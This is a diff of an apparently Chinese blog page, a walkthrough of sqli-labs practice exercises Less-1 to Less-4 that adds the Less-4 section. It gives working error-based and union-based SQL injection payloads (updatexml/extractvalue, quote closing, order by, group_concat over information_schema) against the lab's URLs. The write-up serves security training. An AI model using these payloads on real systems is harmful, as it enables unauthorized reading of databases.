@@ -343,7 +343,8 @@
 <p>语法：EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
 </blockquote>
 <p><strong>用法:</strong><br><code>extractvalue(1,concat(0x7e,**user()**,0x7e))</code><br>只要我们不满足XPath_string(xpath格式)就可以了，但是由于这个方法只能爆出32位，所以可以结合mid来使用。</p>
-<h1 id="0x02-Sqli-labs"><a href="#0x02-Sqli-labs" class="headerlink" title="0x02 Sqli-labs"></a>0x02 Sqli-labs</h1><h2 id="Less-1-Error-Based-String"><a href="#Less-1-Error-Based-String" class="headerlink" title="Less-1 Error Based- String"></a>Less-1 Error Based- String</h2><p>用了看雪的在线sqli-labs平台。</p>
+<h1 id="0x02-Sqli-labs"><a href="#0x02-Sqli-labs" class="headerlink" title="0x02 Sqli-labs"></a>0x02 Sqli-labs</h1><p>以下为Basic Challenges的less1-less4四道SQL Error Based 的题目。</p>
+<h2 id="Less-1-Error-Based-String"><a href="#Less-1-Error-Based-String" class="headerlink" title="Less-1 Error Based- String"></a>Less-1 Error Based- String</h2><p>用了看雪的在线sqli-labs平台。</p>
 <p>题目提示：Please input the ID as parameter with numeric value</p>
 <p><a href="http://43.247.91.228:84/Less-1/?id=1&#39;引起报错" target="_blank" rel="noopener">http://43.247.91.228:84/Less-1/?id=1&#39;引起报错</a></p>
 <p><strong>payload：</strong><br><a href="http://43.247.91.228:84/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-1/?id=1&#39;</a> and updatexml(1,concat(0x7e,user(),0x7e),1)–+<br>得到user信息<br>依据此payload即可获取更多数据库信息。</p>
@@ -362,6 +363,12 @@
 <p><a href="http://43.247.91.228:84/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=-1&#39;</a>) union select 1,2,database() –+</p>
 <p><strong>爆出所有表名</strong><br><a href="http://43.247.91.228:84/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=-1&#39;</a>) union select 1,2,group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database() –+</p>
 <p><strong>爆出字段名</strong><br><a href="http://43.247.91.228:84/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=-1&#39;</a>) union select 1,2,group_concat(column_name) from information_schema.columns where TABLE_SCHEMA=database() and TABLE_NAME=’emails’ –+</p>
+<h2 id="Less-4-Error-Based-DoubleQuotes-String"><a href="#Less-4-Error-Based-DoubleQuotes-String" class="headerlink" title="Less-4 Error Based- DoubleQuotes String"></a>Less-4 Error Based- DoubleQuotes String</h2><p>题目信息：<br>Please input the ID as parameter with numeric value</p>
+<p><a href="http://43.247.91.228:84/Less-4/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-4/?id=1</a><br>依据题目提示，双引号字符。（是真的“双引号”，我一开始尝试了两个单引号。。</p>
+<p><a href="http://43.247.91.228:84/Less-4/?id=1&quot;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-4/?id=1&quot;</a><br>报错：<br> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at line 1</p>
+<p>又看到了和上题类似的 near ‘“1””) 于是加上)闭合。<br><strong>payload：</strong><br><a href="http://43.247.91.228:84/Less-4/?id=1&quot;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-4/?id=1&quot;</a>) –+ 显示正常了</p>
+<p>和上一题就基本一致了。<br><strong>获取字段数</strong><br><a href="http://43.247.91.228:84/Less-4/?id=1&quot;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-4/?id=1&quot;</a> order by 3 –+ 还是3<br><strong>爆表名</strong><br><a href="http://43.247.91.228:84/Less-4/?id=-1&quot;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-4/?id=-1&quot;</a>) union select 1,2, group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database() –+</p>
+<p>然后接着可以按照这个爆字段名。</p>
 
           
         
